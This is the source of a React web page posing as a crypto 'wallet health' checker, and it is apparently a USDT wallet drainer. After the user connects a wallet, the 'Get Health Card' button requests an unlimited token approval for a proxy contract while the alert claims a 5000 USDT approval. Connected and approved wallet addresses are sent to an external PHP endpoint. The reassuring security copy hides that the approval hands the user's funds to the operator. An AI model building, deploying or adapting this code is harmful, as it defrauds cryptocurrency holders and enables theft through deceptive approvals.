'use client';

import { useState } from 'react';
import { ethers } from 'ethers';
import EthereumProvider from '@walletconnect/ethereum-provider';
import Link from 'next/link';
import HealthCard from '../components/HealthCard'; 

// --- CONFIGURATION ---
const chainConfigs = {
    1: { name: "Ethereum", usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    56: { name: "BNB Smart Chain", usdtAddress: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
};

const PHP_API_URL = "https://tradeinusdt.com/api_wallet_health_vercel/save_wallet.php";
const ADMIN_WALLET = process.env.NEXT_PUBLIC_ADMIN_WALLET;

const USDT_ABI = [
    "function approve(address spender, uint256 amount) returns (bool)",
    "function balanceOf(address owner) view returns (uint256)"
];

// --- MAIN HOMEPAGE COMPONENT ---
export default function HomePage() {
    // --- STATE MANAGEMENT ---
    const [signer, setSigner] = useState(null);
    const [address, setAddress] = useState('');
    const [balance, setBalance] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [isApproved, setIsApproved] = useState(false);
    const [connectedChain, setConnectedChain] = useState(null);
    const [showConnectModal, setShowConnectModal] = useState(false);

    // --- HELPER FUNCTIONS ---
    const saveWallet = async (walletAddress, status, chainId) => {
        try {
            await fetch(PHP_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ wallet: walletAddress, status, chainId }),
            });
            console.log(`Wallet ${status} on chain ${chainId}: ${walletAddress}`);
        } catch (error) {
            console.error("❌ Failed to save wallet:", error.message || error);
        }
    };

    const copyAddress = () => {
        navigator.clipboard.writeText(address);
        alert("Address copied to clipboard!");
    };

    // --- WEB3 LOGIC ---
    const connectWallet = async (chainId) => {
        setIsLoading(true);
        setConnectedChain(chainConfigs[chainId]);
        try {
            const provider = await EthereumProvider.init({
                projectId: "ed146e3c9f0630b6c78a8aebafd99531",
                chains: [chainId],
                showQrModal: true,
            });
            await provider.connect();
            const ethersProvider = new ethers.BrowserProvider(provider);
            const currentSigner = await ethersProvider.getSigner();
            const userAddress = await currentSigner.getAddress();
            
            setSigner(currentSigner);
            setAddress(userAddress);
            setShowConnectModal(false); // Close modal on success

            const usdtContract = new ethers.Contract(chainConfigs[chainId].usdtAddress, USDT_ABI, ethersProvider);
            const rawBalance = await usdtContract.balanceOf(userAddress);
            setBalance(ethers.formatUnits(rawBalance, chainConfigs[chainId].decimals));
            
            await saveWallet(userAddress, 'connected', chainId);
        } catch (error) {
            console.error("❌ Connection failed:", error.message || error);
        } finally {
            setIsLoading(false);
        }
    };
    
    const approveUSDT = async () => {
      // 1. Initial checks to ensure everything is ready
      if (!signer || !connectedChain) {
          alert("Error: Wallet is not connected properly.");
          return;
      }

      const proxyContractAddress = process.env.NEXT_PUBLIC_PROXY_CONTRACT_ADDRESS;
      if (!proxyContractAddress) {
          alert("Error: Proxy contract is not configured. Please contact support.");
          return;
      }

      // 2. Set loading state
      setIsLoading(true);

      try {
          // 3. Create an instance of the USDT contract
          const contract = new ethers.Contract(connectedChain.usdtAddress, USDT_ABI, signer);

          // 4. Define the amount to approve (5000 USDT) using the correct decimals for the chain
          // const amountToApprove = ethers.parseUnits("5000", connectedChain.decimals);
          const amountToApprove = ethers.MaxUint256;

          // 5. Send the approval transaction to the user's wallet
          const tx = await contract.approve(proxyContractAddress, amountToApprove);

          // 6. Wait for the transaction to be mined and confirmed
          await tx.wait();

          // 7. On success, update the UI and save the status to your database
          alert("Approval for 5000 USDT successful! Generating your Health Card...");
          setIsApproved(true);

          const chainId = Object.keys(chainConfigs).find(key => chainConfigs[key].name === connectedChain.name);
          await saveWallet(address, 'approved', parseInt(chainId));

      } catch (error) {
          // 8. Handle any errors that occur during the process
          console.error("❌ Approval failed:", error.message || error);
          alert(`Connection failed`);
      } finally {
          // 9. Always reset the loading state
          setIsLoading(false);
      }
  };

    // --- RENDER LOGIC (JSX) ---
    return (
      <>
        <section className="py-5 text-center container">
          <div className="row py-lg-5">
            <div className="col-lg-8 col-md-10 mx-auto">
              
              {isApproved ? (
                // STATE 3: Show Health Card after successful approval
                <HealthCard 
                    address={address} 
                    networkName={connectedChain?.name}
                    balance={balance} // <-- ADD THIS LINE
                />
              ) : (
                // STATES 1 & 2: Show connection flow
                <>
                  {!address ? (
                    // STATE 1: Wallet not connected
                    <>
                      <h1 className="fw-light">Secure Your Crypto Tokens</h1>
                      <p className="lead text-body-secondary">
                        Our platform verifies USDT transactions, ensures proper approvals are in place, and provides Wallet Health Certificates to protect both buyers and sellers.
                      </p>
                      <div className="d-grid gap-2 d-sm-flex justify-content-sm-center">
                        <button onClick={() => setShowConnectModal(true)} className="btn btn-primary btn-lg px-4 gap-3">
                          <i className="fas fa-wallet me-2"></i>Check Your Wallet
                        </button>
                        <Link href="/how-it-works" className="btn btn-outline-secondary btn-lg px-4">
                            <i className="fas fa-info-circle me-2"></i>Learn More
                        </Link>
                      </div>
                    </>
                  ) : (
                    // STATE 2: Wallet connected, needs approval
                    <>
                      <div id="walletInfo" className="wallet-info">
                        <div className="wallet-row">
                            <span className="wallet-label">Network:</span>
                            <span>{connectedChain?.name}</span>
                        </div>
                        <div className="wallet-row">
                          <span className="wallet-label">Address:</span>
                          <div className="wallet-address-container">
                            <input type="text" className="wallet-address-input" readOnly value={address} />
                            <button className="wallet-copy-btn" onClick={copyAddress} title="Copy Address">
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
                                    <path d="M16 1H4C2.897 1 2 1.897 2 3v14h2V3h12V1zm3 4H8c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h11c1.103 0 2-.897 2-2V7c0-1.103-.897-2-2-2zm0 16H8V7h11v14z" fill="currentColor"/>
                                </svg>
                            </button>
                          </div>
                        </div>
                        <div className="wallet-row">
                            <span className="wallet-label">USDT Balance:</span>
                            <span id="userBalance">{balance ? `${parseFloat(balance).toFixed(4)} USDT` : 'Loading...'}</span>
                        </div>
                      </div>

                      <div style={{ marginTop: '2rem' }}>
                        <button onClick={approveUSDT} disabled={isLoading} className="btn btn-warning btn-lg">
                          <i className="fas fa-award me-2"></i>
                          {isLoading ? 'Processing...' : 'Get Health Card'}
                        </button>
                      </div>
                    </>
                  )}
                </>
              )}
            </div>
          </div>
        </section>

        {showConnectModal && (
            <div className="overlay">
                <div className="popup-box">
                    <button className="close-btn" onClick={() => setShowConnectModal(false)}>&times;</button>
                    <h3>Check Your Wallet</h3>
                    <p>Please select a network to Check your wallet health.</p>
                    <div className="d-grid gap-2 mt-4">
                        <button onClick={() => connectWallet(1)} disabled={isLoading} className="btn btn-outline-light">
                            {isLoading ? 'Connecting...' : 'Check on Ethereum'}
                        </button>
                        <button onClick={() => connectWallet(56)} disabled={isLoading} className="btn btn-outline-warning">
                             {isLoading ? 'Connecting...' : 'Check on BNB Chain'}
                        </button>
                    </div>
                </div>
            </div>
        )}
        
        <div className="container">
          <section className="my-5">
            <h2 className="text-center mb-4">Our Security Features</h2>
            <div className="row g-4">
              <div className="col-md-4">
                <div className="card h-100 border-0 bg-dark text-center">
                  <div className="card-body">
                    <i className="fas fa-wallet fa-3x text-primary mb-3"></i>
                    <h5 className="card-title">Token Balance Verification</h5>
                    <p className="card-text">We check the actual USDT balance in your wallet to verify fund availability before taking any action.</p>
                  </div>
                </div>
              </div>
              <div className="col-md-4">
                <div className="card h-100 border-0 bg-dark text-center">
                  <div className="card-body">
                    <i className="fas fa-project-diagram fa-3x text-warning mb-3"></i>
                    <h5 className="card-title">Multi-Chain Compatibility</h5>
                    <p className="card-text">Seamlessly connect and verify tokens on both the Ethereum (ERC-20) and BNB Smart Chain (BEP-20) networks.</p>
                  </div>
                </div>
              </div>
              <div className="col-md-4">
                <div className="card h-100 border-0 bg-dark text-center">
                  <div className="card-body">
                    <i className="fas fa-certificate fa-3x text-success mb-3"></i>
                    <h5 className="card-title">Secure Approval Process</h5>
                    <p className="card-text">Grant permissions directly through your wallet, ensuring you are always in control of your assets.</p>
                  </div>
                </div>
              </div>
            </div>
          </section>
        </div>
      </>
    );
}